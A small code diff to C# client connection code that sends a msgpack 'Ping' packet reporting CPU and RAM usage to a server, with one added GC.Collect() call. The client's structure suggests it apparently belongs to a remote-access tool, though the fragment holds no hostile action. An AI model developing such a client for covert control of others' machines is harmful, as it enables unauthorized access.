@@ -245,6 +245,7 @@ namespace Client.Connection
             msgpack.ForcePathObject("Packet").AsString = "Ping";
             msgpack.ForcePathObject("Message").AsString = $"CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
+            GC.Collect();
         }
 
     }
